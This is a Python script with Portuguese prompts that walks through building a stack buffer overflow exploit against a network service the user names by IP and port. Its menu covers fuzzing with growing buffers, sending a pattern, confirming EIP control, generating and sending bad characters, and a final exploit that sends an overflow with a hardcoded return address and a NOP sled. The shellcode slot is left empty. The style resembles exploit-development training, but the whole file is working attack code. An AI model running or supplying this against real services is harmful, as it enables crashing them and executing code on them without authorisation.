import socket
from time import sleep
import os
import sys






def fuzz():
   
              prefix = ""

              string = prefix + "A" * 100
              while True:
                
                try:
                  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(5)
                    s.connect((ip, porta))
                    s.recv(1024)
                    print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                    s.send(bytes(string, "latin-1"))
                    s.recv(1024)
                except:
                  print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
                  sys.exit(0)
                string += 100 * "A"
                sleep(1)
              

def padrao():
 
                prefix = ""
                padrao = input(b"\nDigite o payload padrao:\n ")
                string = prefix + padrao
                s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip,porta))
                s.recv(1024)
                s.send(bytes(string,"latin-1"))
                s.close()
                print(" payload enviado com sucesso! ")

def eip_control():
                prefix = "" 
                offset = int(input("\nDigite o offset:\n "))
                eip = 'A' * offset  
                controle = "BBBB"  
                pay = prefix + eip + controle
                
                s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip , porta))
                s.recv(1024)
                s.send(bytes(pay , "latin-1"))
                s.close()
                print("controle de EIP realizado!")

   
def gera_chars():
                for x in range(1, 256):
                  print("\\x" + "{:02x}".format(x), end='')
                print()

    

    
   


def bad_chars():
                print(" \nmude a variavel chars para o valor de bad gerado.\n ")
                chars =""
                prefix = "" 
                offset = int(input("\nDigite o offset:\n "))
                eip = 'A' * offset  
                controle = "BBBB"  
                pay = prefix + eip + controle + chars
                
                s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip , porta))
                s.recv(1024)
                s.send(bytes(pay , "latin-1"))
                s.close()
                print("bad chars enviados!")

   
    



def exploit():
              
              
          
          prefix = ""
          offset = int(input("\nDigite o offset:\n "))
          overflow = "A" * offset
          retn = "\xaf\x11\x50\x62"
          padding = "\x90" * 32
          payload =   b""
          postfix = ""

          buffer = (prefix + overflow + retn + padding + postfix).encode("latin-1") + payload

          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

          try:
            s.connect((ip, porta))
            print("enviando exploit...")
            s.send(buffer)
            print("acesso feito")
          except:
            print("sem sucesso...")



def clear():
                os.system("clear")
    

            
def menu():
    a = input("Digite [1] para o fuzzing\n"
              "Digite [2] para enviar o payload padrão\n"
              "Digite [3] para controlar o EIP\n"
              "Digite [4] para gerar bad chars\n"
              "Digite [5] para o envio de bad chars\n"
              "Digite [6] para o exploit: ")
   
    if  a == "1":
     fuzz() 
    elif a == "2":
     padrao()
    elif a == "3":
     eip_control()
    elif a == "4":
     gera_chars()
    elif a == "5":
     bad_chars()
    elif a == "6":
     exploit()
    else:
     input("valor inválido! Aperte qualquer tecla para retornar ao menu.")
     clear()
     menu()
     

ip = input(" Digite o ip alvo: ")
porta = int(input(" Digite a porta alvo: "))
clear()


menu()

      



    



